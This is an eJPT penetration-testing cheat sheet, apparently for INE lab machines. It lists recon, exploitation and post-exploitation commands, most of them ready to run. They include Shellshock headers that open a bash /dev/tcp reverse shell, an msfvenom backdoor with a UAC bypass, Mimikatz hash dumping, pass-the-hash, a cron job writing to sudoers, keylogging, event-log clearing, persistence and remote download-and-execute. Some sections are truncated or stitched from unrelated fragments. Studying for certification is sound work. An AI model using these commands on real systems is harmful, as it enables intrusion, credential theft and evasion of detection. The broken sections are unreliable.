# eJPT Cheat Sheet

#### Find IP address of a website:

```shell
host <url>
```

> If you see two addresses or ip addresses than that means the website is behind some kind of proxy or firewall like the cloud flare.

#### Whois recon:

```shell
whois <url>
```

> The `whois` command retrieves registration details about a domain name, such as the owner, contact information, and the domain's creation and expiration dates.

#### DNS Recon

```shell
dnsrecon -d <domain>
```

> DNS Dumpster can be used to perform the same function.

#### WAF w00f command:

```shell
wafw00f <url> -a
```

> Will tell whether the web application is protected by a firewall or not. And if its is protected by the firewall than what solution is being used.

#### Sublist3r

```shell
sublist3r -d <domain>
```

> Looks for subdomains on different search engines.

#### Google Dorking:

```shell
site:<domain>
```

> This limits all the searches to a particular domain only. Will also show some subdomains of the particular domain used.

```shell
site:<domain> inurl:<keyword> 
site:ine.com inurl:admin
```

> This can be used to search a particular key word within the domain URL.

```shell
site:*.<domain>
```

> This would not show the domain it self but its subdomains.

```shell
site:*.<domain> intitle:<keyword>
```

> This will search subdomains with a particular key word in its tittle.

```shell
site:*.<domain> filetype:<type>
site:*.ine.com filetype:PDF
```

> Searches for PDFs (particular file type) in subdomains.

```shell
intitle:index of 
```

> This basically tracks the directory listing vulnerability.

```shell
cache:<domain>
```

> This basically shows the older version of the website.

```shell
inurl:auth_user_file.txt
```

> This would enlist all the website with the same `.txt` file. Such files can be used for storing user authentication passwords.

```shell
inurl:wp-config.bak
```

> Can be used to find WordPress Backup Config Files. Can contain passwords for MySQL servers.

#### theHarvester:

```shell
theharvester -d <domain> -b google,yahoo,<any-other>
```

> Looks for emails and names on a particular website.

#### Zoon Transfer:

```shell
dnsenum <domain>
```

> dnsenum can be used to perform a DNS Brute-force as well.

```shell
dig axfr @<name-server> <domain>
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

> `axfr` is the switch for zone transfer.

```shell
fierce -dns <domain>
```

> It can also be used for performing a DNS Brute-force.

#### Host Discovery using Nmap:

```Shell
sudo nmap -sn <ip-address>/<sub-net-if-any>
```

> Pings all the IPs with in the sub-net and shows only ones that ping back.

```Shell
sudo netdiscover -i <interface> -r <ip-address>/<sub-net-if-any>
sudo netdicover -i eth0 -r 192.168.3.0/24
```

> `-i` is used for the interface and `-r` is used for the ip-address range. It uses ARP to scan the hots.

#### Nmap scans:

`nmap`...Then remember:
- `-sS`: SYN scan (Stealth scan, faster than TCP connect)
- `-sT`: TCP connect scan (Standard TCP scan)
- `-sU`: UDP scan (Scan for open UDP ports)
- `-sA`: ACK scan (Checks firewall rules filtered or not) 
- `-sP` or `-sn`: Ping scan (Find online hosts)
- `-sV`: Version detection (Identify services/version info)
- `-sC`: Default script scan (Runs default NSE scripts)
- `-O`: OS detection (Guess the operating system)
- `-p`: Port selection (Scan specific ports)
- `-F`: Fast scan (Scans fewer ports for speed)
- `-f` Fragmentation 
- `-A`: Aggressive scan (OS detection, version detection, script scanning, and traceroute)
- `-D` Decoy.
- `-T<0-5>`: Timing template (Adjusts scan speed, from `0` (paranoid) to `5` (insane))
- `-oN`: Output in normal format (Saves scan output to a file)
- `-oX`: Output in XML format (Saves scan output in XML format)
- `-oG`: Greppable output (Saves scan output in a grep-friendly format)
- `-oA`: Output in all formats (`-oN`, `-oX`, `-oG` combined)
- `-v`: Verbose mode (Displays more information during the scan)
- `-n`: No DNS resolution (Skips DNS resolution)
- `-6`: IPv6 scanning (Scan using IPv6 addresses)
- `-R`: Always resolve DNS (Resolves domain names, even if not needed)
- `-Pn`: No ping (Skips host discovery, assumes hosts are up)
- `-PS` SYN ping.
- `-iL`: Input from a file (Scans hosts listed in a file)
- `-oX -`: Output to stdout in XML format (Useful for piping into other tools)
- `--host-timeout <time>`: Host is skipped if it doesn't responds in the set time periord.
- `--script`: Run specific NSE scripts (For customized scans)
- `--traceroute`: Perform a traceroute (Maps the route to the host)
- `--reason`: Display the reason for each host/port state
- `--osscan-guess`: OS Version probability.

Example:
```bash
nmap -sS -p 1-100,443 192.168.1.13,14
```

Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
Tip: Use `--open` to show only open, open filtered, and unfiltered ports.

```console
nmap -T4 -sS -sV --version-intensity 8 <ip-address>
```

> In Nmap, the `--version-intensity` option controls the intensity of version detection scanning. It takes a value from 0 to 9, where:
   **0**: Lightest intensity, meaning Nmap will try very few probes to determine the service version.
   **9**: The highest intensity, meaning Nmap will use the most comprehensive set of probes to determine the service version.

```bash
nmap -sV -sC 192.168.1.1
```

>TCP Quick Scan

```bash
nmap -sV -sC -p- 192.168.1.1
```

> TCP Full Scan

```bash
nmap -sV -sU 192.168.1.1
```

> UDP Quick Scan

```bash
nmap -sC -p 27017 192.168.1.13 | less
```

> Get info on a particular service:

```

> Basic command to run any script.

```Shell
nmap --script=<keyword-*> <ip-address>
nmap --script=ftp-* 10.10.10.10
```

> It is used to run all the scripts related to any keyword.

```Shell
nmap --mtu <size> <target>
nmap --mtu 32 example.com
```

> The `--mtu` flag allows you to set a custom Maximum Transmission Unit (MTU) for the packets that Nmap sends during scanning.

```Shell
nmap demo.ine.local -p 177 -A
```

> We can perform an Nmap port scan on the target system to identify whether the BIND DNS server is open. 

```Shell
nmap 10.0.24.0/20 --open
```

> This command scans the subnet and shows only the open ports of the target.

```Shell
nmap -p 443 --script ssl-heartbleed <ip-address>
```

> This checks that whether the host machine is vulnerable to Heat Bleed Vulnerability or not.

#### Windows Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

This is a built in meterpreter command i.e. `getsystem` that uses some techniques to escalate the privileges. It can used in some cases as well. 

```msfconsole
use post/multi/recon/local_exploit_suggester
show options
set SESSION <session-ID>
run
```

> It will tell the exploit modules that you can try to elevate your privileges.

```msfconsole
use exploit/windows/local/ms16_014_wmi_recv_notif
show options
set SESSION <session-ID>
set LPORT <port-number>
exploit
```

> It can be used to escalate privileges in vulnerable windows 7 machine.

```Shell
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

> This tool compares a target path levels with Microsoft vulnerability database in order to detect missing patches on the target that can be then exploited.

**How to use:**

First get the system info from the meterpreter session by `shell > systeminfo`. Then copy this info in a text file and then pass this as an argument to the tool.

**Step 01:**

```Shell
$ ./windows-exploit-suggester.py --update
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2014-06-06-mssb.xlsx
[*] done
```

**Step 02:**

```Shell
install python-xlrd, $ pip install xlrd --upgrade
```

**Step 03:**

```Shell
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

#### Bypassing UAC with UACMe:

***UAC STANDS FOR USER ACCOUNT CONTROL***

```meterpreter
pgrep explorer
migrate <process-ID>
```

> This command can be used to switch to the 64 Bit meterpreter session.

```Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
```

> Generating malicious executable using msfvenom.

```console
/root/Desktop/tools/UACME/Akagi64.exe
```

> Location of the `Akagi` exploit that is used to bypass UAC.

```Shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

> `Akagi` command is used to run the exploit by bypassing the UAC.

```CMD
ps -S lsass.exe
migrate <process-ID>
```

> After the exploitation and meterpreter session migrate to the `lsass.exe` process.

#### Access Token Impersonation:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

***YOU HAVE TO PERFROM THE FOLLOWING FUNCTION IN THE METERPRETER SESSION. YOU CAN TO FOLLOWING IF AND ONLT IF YOU HAVE THE `SeImpersonationPrivilages` IN THE `getprivs` SECTION***

```msfconsole
load incognito
list_tokens -u
impersonate_token "<group-name>\Administrator"
getuid
pgrep explorer
migrate <process-id>
```

***IF YOU DONT FIND ANY PRIVILAGED TOKENS IN BOTH DELEGATION TOKENS AND IMPERSONANTION TOKENS THAN YOU HAVE TO USE THE POTATO ATTACK***

#### Searching for Passwords In Windows Configuration Files:

***YOU NEED ELIVATED PRIVILEGES TO DUMP HASHES***

```Shell
C:\\Windows\Panther\Unattend.xml >> in base64
C:\\Windows\Panther\Autounattend.xml
```

> These are the configuration files that contain the user accounts and their passwords along side system configuration. In unattend the passwords are stored in base64.

#### Dumping hashes with Mimikatz:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.


```msfconsole
load kiwi
?
creds_all
lsa_dump_sam
lsa_dump_secrets
```

> Dumping passwords hashes using `kiwi`.

```msfconsole
upload usr/share/windows-resources/mimikatz/mimikatz.exe
shell
dir
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

> Command can be used to upload the `mimikatz.exe` file and then run it in the windows shell.

#### Pass-The-Hash:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold and after getting the hashes from the kiwi module. Make sure to make a file to store all the hashes in it.


```msfconsole
use exploit/windows/smb/psexec
show options
set LPORT <some-new-port>
set RHOST <ip-address>
set SMBUser Administrator <any-other-user-can-be-used>
set SMBPass <NTLM-HASH:LM-HASH>
set target Native\ upload
exploit
```

> Via these commands if everything goes smoothly you'll have a successful pass-the-hash attack.

```Shell
crackmapexec smb <ip-address> -u Administrator -H "<NTLM-HASH>" -x "any-command"
```

> Pass-the-hash attack using `crackmapexec`.

```Shell
ruby evil-winrm.rb -i 10.0.0.20 -u user -H <NTLM-HASH>
```

> `evil-winrm.rb` tool can be used to perform the same function.

#### Linux Exploitation:

#### Shell Shock:

```Shell
nmap -sV <ip-address> --script=http-shellshock --sctipt-args "http-shellshock.uri=/gettime.cgi"
```

> A shell shock vulnerability script.

***TO EXPLOIT IT VIA BRUP SUITE WE HAVE TO PASS COMMANDS IN THE  USER AGENT HEADER AS SHOWN BELOW***

> First send it to the repeater and then change the header in the repeater tab. 

```HTTP
User Agent: () { :; }; echo; echo; /bin/bash -c '<command>'
User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/password' 
```

***FOLLOWING IS THE METHOD TO GAIN A REVERSE SHELL FROM BURP SUITE***

```Shell
nc -nvlp 1234
```

> First turn on the net cat on listening mod on port 1234.

```http
User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<host-ip-addresss>/1234 0>&1'
User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
```

> This header upon running will give a reverse shell on the system.

```msfconsole
use exploit/multi/http/apache_mod_cgi_bach_env_exec
show options
set RHOST <ip-address>
set TARGETURI /gettime.cgi
exploit
```

> Module for exploitation the shellshock vulnerability. 

#### SAMBA Commands:

```Shell
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> smb
```

> Brute force samba command.

```Shell
smbmap -H <ip-address> -u <user-name> -p password1
```

> List downs all the shares of the given user.

```Shell
smbclient //<ip-address>/<share-name> -U admin 
```

> This command be used to connect to a particular share.

```Shell
enum4linux -a <ip-address>
```

> Basic target information.

```Shell
enum4linux -a -u <user-name> -p <password> <ip-address>
```

> For a particular user.

#### Linux Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

```meterpreter
upload les.sh
shell
/bin/bash -i
chmod +x les.sh
./les.sh
```

> This script works as the exploit suggester for linux.

```console
https://www.exploit-db.com/exploits/40839
```

> This link has the exploit for the dirty cow vulnerability.

```Shell
gcc -pthread <exploit-file-name>.c -o dirty -lcrypt
chmod +x dirty
```

> This forms the executable of the given file by the name `dirty`. After this upload the file on the machine using the meterpreter session.

***IF IT ISN'T WORKING YOU CAN THEN UPLOAD THE C FILE DIRECTLY ON TO THE MACHINE AND THEN RUN THESE COMMADS THERE TO FORM AND EXECUTABLE***

> After the script has ran successfully it will create a user by the name `firefart` that would have the root privileges.

#### Cron Jobs

> We will be targeting Cron Jobs that have been created by the `root` user in order to escalate our privileges.

```Shell
crontab -l
```

> The command to display the list of scheduled cron jobs for the current user is

```Shell
grep -nri “/tmp/message” /usr
```

> The command is used to search for the string `"/tmp/message"` within files located under the `/usr` directory.

```Shell
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

> Exploiting the cron jobs misconfiguration.

#### Exploiting SUID Binaries:

***SET OWNER USER ID***

```Shell
| -rwsr-xr-x | 1 | root  |  8344 | Sep 222  |  2018 | welcome
```

> Now here the `s` in the permissions section is the `SUID` permission. So that means it is being executed by the root privileges. 

```Shell
rm <file-name>
cp /bin/bash <file-name>
```

> Now if we remove a file that is being run by the welcome file as shown above and make a file with the same name but with the components of `/bin/bash`. Then upon executing the `welcome` file we will get the root privileges.

#### Dumping Linux Passwords Hashes:

```console
/etc/shadow
```

> This file has all the hashes for the user that are using that particular machine and this can only be accessed by a root user or a user with privileged access.

```console
root:$6$gvewkfv7o7i32ugbc328pgibcewuhjbh:45678:0:999999:7:::
```

> This is an exemplary hash 

```msfconsole
use post/linux/hashdump
show options 
set SESSION <session-ID>
run
```

> This modules will also perform the same function

```msfconsole
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

> This module can be used to crack a hash.

#### SMB & NetBIOS Enumeration:

```msfconsole
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

> This module can be used to exploit the machine using `smb` creds.

```Shell
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

> Hydra command to brute force `smb` users pass.

```cmd
run autoroute -s 10.0.22.69/20
```

> This command is related to managing and utilizing routes within a compromised network during a penetration test. By running `autoroute -s 10.0.22.69/20`, you are instructing Metasploit to add a route to the network `10.0.16.0/20` via the compromised machine.

```shell
cat /etc/proxychains4.conf
```

> Socks proxy configuration is in this file.

```msfconsole
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

> This module can be used to set up `socks4a` proxy chain.

```Shell
proxychains <command>
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

> This is how you can run commands to other machine using `proxychains` from `metasploit`.

```CMD
net view 10.0.22.69
```

> This lists down all the shared resources (if any) between two machines on a network.

```cmd
net use D: \\10.0.22.69\Documents
net use K: \\10.0.22.69\K$
dir D:
dir K:
```

> Command to load and access the shared resources.


#### SNMP Enumeration:

```Shell
nmap -sU -p 161 <ip-address>
```

> We must keep in mind that **nmap** does not check for **UDP** ports by default. As we already know, **SNMP** runs on the **UDP** port **161**. So we have to run a special specific scan.

```Shell
nmap -sU -p 161 --script=snmp-brute <ip-address>
```

>  nmap `snmp-brute` script can be used to find the community string. The script uses the `snmpcommunities.lst` list for brute-forcing it is located inside `/usr/share/nmap/nselib/data/snmpcommunities.lst` directory.

```Shell
snmpwalk -v 1 -c public demo.ine.local
```

> `snmpwalk` tool can be used to find all the information via SNMP.

`-v`: Specifies SNMP version to use.
`-c`: Set the community string.

```Shell
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
```

> The above command would run all the nmap SNMP scripts on the target machine and store its output to the`snmp_output`file.

```Shell
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

> After this `psexec` can be used to exploit the machine.

#### SMB Relay Attack:

```msfconsole
use exploit/windows/smb/smb_relay
show options
set LHOST <our-ip-address>
set SRVHOST <our-ip-address>
set SMBHOST <target-ip-address>
exploit
jobs
```

> This will start the server up for the relay attack.

```Shell
echo "<our-ip-address> *.sportsfoo.com" > dns
```

> By this command we have created a fake kind of `DNS` file that can be used to spoof the DNS then.

```Shell
dnsspoof -i eth1 -f dns
```

> The command  uses the `dnsspoof` tool to intercept and spoof DNS queries on the network interface `eth1`, using the DNS in the `dns` file that we just created. This is used to attract all the traffic towards the attacker machine.

```Shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> This command can be used to enable ip-forwarding.

```Shell
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

> The attacker positions themselves in the middle of the communication between `172.16.5.5` and `172.16.5.1`, enabling a Man-in-the-Middle (MitM) attack.

***EXPLAINATION:***

The commands use `arpspoof` to perform ARP spoofing, tricking the devices at IP addresses `172.16.5.5` and `172.16.5.1` into thinking the attacker's MAC address belongs to each other. This redirects the network traffic between these two devices through the attacker, enabling a Man-in-the-Middle (MitM) attack.

#### Importing Nmap Scan Results Into MSF

> Following set of commands can be used to import a scan into your `msfconsole`

```msfconsole

set LHOST <local-ip>
run
```

> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command.

#### SAMBA Exploitation

```msfconsole
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
set RHOST <ip-address>
check
exploit
```

> `check` command can be used to identify whether the system is vulnerable or not. This will give us a command shell session not a meterpreter session so we would have to go it our selves using `shell_to_meterperter` module.

```msfconsole
CTRIL + Z
y
use post/multi/manage/shell_to_meterpreter
show options
set LHOST <local-ip> 
set LHOST eth1
run
```

```msfconsole
CTRIL + Z
y
use post/multi/manage/shell_to_meterpreter
show options 
set LHOST eth1
set SESSION <session-id>
run
```

> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command. Other than this you can also use the `sessions -u 1` command to upgrade a shell session into a meterpreter session.

#### SMTP Server Exploitation

set rhost <ip-address>
set SEVPORT 9898
set email_to <email-address>
set payload linux/x64/meterpreter_reverse_http
set LHOST eth1
run
```

> This module after running will give us a meterpreter session. In the module `email_to` should be an email that the server should accept.

#### Meterpreter Commands:

- `sysinfo`: This gives us basic system info like the OS, PC Name and all
- `get uid`: This command tells us about our permissions.
- `help`: This gives all the commands and their details.
- `backgroud`: This is used to put the session in background.
- `kill`: This will kill the current session.

- `show_mount`: This will tell all the disks mounted with the windows user.
- `migrate <pid>`: This can be used to migrate to any current running processes.
- `loot`: After that you have ran some enumeration modules you can find the data saved in texts using this command 

#### Windows Post Exploitation Module:

```msfconsole
use post/windows/manage/migrate
set SESSION <session-id>
run
```

> This module can be used to create a new process and then migrate into it. If you already have migrated then this would not work.

```msfconsole
use post/windows/gather/win_privs
show options
set SESSION <session-id>
run
```

> This is list out all the privileges that the current exploitered user have.

```
use post/windows/gather/enum_logged_on_users
show options
set SESSION <session-id>
run
```

> This will list all the currently and recently logged on users.

```msfconsole
use post/windows/gather/checkvm
show options
set SESSION <session-id>
run
```

> This will tell us weather that machine is a VM or not.

```msfconsole
use post/windows/gather/enum_applications

set SESSION <session-id>
run
```

> This lists down all the application and their respective versions installed on the machine so that they can be used to further exploit and elevate the privileges.

```msfconsole
use post/windows/gather/enum_av_excluded
show options
set SESSION <session-id>
run

> This module can be used to list out all the directories that are currently not looked after by the AV or the Win Defender.

```msfconsole
use post/windows/gather/enum_computers
show options
set SESSION <session-id>
run
```

> This will tell us whether the machine is a stand alone machine or a machine that is part of a domain.

```msfconsole
use post/windows/gather/enum_patches
show options
set SESSION <session-id>
run
```

> This will give us the patches that being installed in the machine. You can also do this by typing the `shell > systeminfo` command as it is a native windows command.

```msfconsole
use post/windows/gather/enum_shares
show options
set SESSION <session-id>
run
```

> This will lists all the shares within the machine.

```msfconsole
use post/windows/manage/enable_rdp
show options
set SESSION <session-id>
run
```

> This will tell us whether `RDP` is enabled on the machine or not. If it isn't enabled than it will enable it by it self.

#### Bypassing UAC Through Memory Injection:

***EVERYTHING DEMOSTARTED BELOW IS DONE AFTER THE FIRST FOOTHOLD HAS BE GAINED***

```
Ctrl + Z
y
use exploit/windows/local/bypassuac_injection
set SESSION <session-id>
set LPORT 4433
set TARGET\ x64
run
```

> This will bypass UAC using the injection method.

#### Exploiting smb using PsExec

```
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

```

***NOW THIS WILL NOT ELEVATE OUR PRIVILAGES BUT WILL GIVE A NEW METERPRETER SESSION THAT WILL HAVE THE UAC FLAG TURNED OFF AND AFTER THAT YOU CAN USE THE*** **`getsystem`** ***COMMAND TO ELIVATE YOUR PRIVILEGES***

#### Establishing Persistence on Windows:

```msfconsole
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
show options
set SESSION <session-id>
run
```

> This will startup a service that we can always connect to via a handler after the current session is terminated.

```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
run
```

> Now if you run this you'll immediately get a meterpreter sessions.

***ALWAYS KEEP IN MIND THE*** **`LHOST`** ***AND*** **`LPORT`** ***OPTIONS***

#### Enabling RDP

```msfconsole
use post/windows/manage/enable_rdp
show options
set RHOSTS <ip-address>
set SESSION <session-id>
run
```

> This will enable the `RDP` service on port `3389`. 

***NOW AFTER THIS WE WOULD HAVE TO CHANGE THE PASSWORD IN ***

```msfconsole
shell
net users
net user administrator <password-any>
```

> This will change the password of the `administrator` user. This can only be done via a privileged access.

```shell
xfreerdp /u:administrator /p:<password-any> /v:<ip-address>
```

> This command can be used from the console of your linux machine in order to interact with the `RCD` of the target machine using the new creds.

#### Windows Keylogging:

***FIRST MIGRATE TO*** **`explorer`** ***PROCESS AND THEN RUN THE KEYLOGGER.***

```msfconsole
pgrep explorer
migrate <pid>
```

> Migration to `explorer`

`keyscan_start`: This will start the key stroke sniffer.
`keyscan_dump`: This will dump all the captured key strokes.

#### Clearing Windows Logs:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

`clearev`: This command in the meterpreter is used to clear the event logs of the machine.

#### Pivoting:

```msfconsole
meterpreter> run autoroute -s 10.0.16.0/20
```

> This command can be used to set route from one network to another network. First type `ifconfig` or `ipconfig` to check all the possible interfaces on the machine.

```msfconsole
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
```

> This module can be then used to run a port scan on the machine who's network route we have just added.

```msfconsole
sessions -i 1
portfwd add -l 1234 -p 80 -r demo2.ine.local
portfwd list
```

> These set of commands can be used to port forward a port of the target machine on to a port of `localhost`.

```shell
nmap -sV -sS -p 1234 localhost
```

> Now you can run a scan the target machines port using this command.

#### Linux Post Exploitation Modules

- `cat /etc/passwd`: This command lists out all the users and service accounts on the machine and needs `root` privileges to execute.
- `groups <username>`: This will tell you which user group the entered username belongs to.
- `bin/bash -i`: This command can be used to get a bash shell after meterpreter session is opened.
- `cat /etc/*issue`: This will tell you the release version of the machine.
- `uname -r`: This tells the kernel version:
- `ps aux`: This command lists down all the processes running on the system.
- `env:` This tells all the environment valuables for the current logged in user.

show options
set SESSION <session-id>
run
```

> This will give addresses of all the configuration files on the machine.

```msfconsole
use post/linux/gather/env
show options
set SESSION <session-id>
run
```

> This will show all the env related data like versions and all.

```msfconsole
use post/linux/gather/enum_network
show options
set SESSION <session-id>
run
```

> This will give all the network related data and configuration files.

```msfconsole
use post/linux/gather/enum_protections
show options
set SESSION <session-id>
run
```

> This module checks all the basic system hardening methods are in place or not.

show options
set SESSION <session-id>
run
```

> This will check whether we are in a container or an actual machine.

```msfconsole
use post/linux/gather/checkvm
show options
set SESSION <session-id>
run
```

> This will tell that weather the machine is a VM or an actual machine.

```msfconsole
use post/linux/gather/enum_users_history
show options
set SESSION <session-id>
run
```

> This lists down all the users history and commands that a specific user ran. It is saved in `loot` as well and you can access the saved data from there as well.

```msfconsole
use post/multi/manage/system_session
set SESSION <session-id>
set TYPE python
set HANDLER true
set LHOST <host-ip>
run
```
### Linux post exploitation module II

```msfconsole
post/multi/gather/ssh_creds
post/multi/gather/docker_creds
post/linux/gather/hashdump
post/linux/gather/ecryptfs_creds
post/linux/gather/enum_psk
post/linux/gather/enum_xchat
post/linux/gather/phpmyadmin_credsteal
post/linux/gather/pptpd_chap_secrets
post/linux/manage/sshkey_persistence
```

> This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.

***FUN STUFF***

```bash
useradd hacker
useradd test
useradd nick
```

> Create a file with the following data and name it as `test.sh`.

```shell
/etc/init.d/apache2 start
cp test.sh /var/www/html
```

> Turn the `apache2` and copy the created file in the `/var/www/html` directory

```msfconsole
use post/linux/manage/download_exec
set URL http://<HOST-IP>/test.sh
set SESSION 1
run
```

> Now use this module to download and run the file on the target machine.

```msfconsole
sessions -i 1
cat /etc/passwd
```

> Now after the execution three users will be created you can check them using the following commands.

#### Linux Privilege Escalation: Exploiting a vulnerable program

***IT DEPENDS ON THE VERSION OF THE LINUX KERNEL RUNNINGON THE MACHINE AND THE DISTRIBUTION VERSION***

```ruby
sessions -u <session-id>
```

> This command can be used to upgrade your current session into a meterpreter session and if it gives you can error then don't worry you can check the new session from the `sessions` command and than load the new one.

```bash
chkrootkit -V
```

> This can be used to check the rootkit version running on the linux machine.

***VERSIONS OLDER THAN 0.50 OF THE CHKROOTKIT ARE VULNARABLE TO LOCAL PRIVELAGE ESCALATION VULNARABILITY***

```msfconsole
search exploit/unix/local/chkrootkit
show options
set CHKROOTKIT /path/to/file
set SESSION <session-id>
set LHOST <localhost-ip>
exploit
```

> This will exploit the vulnerability by creating a cron job.
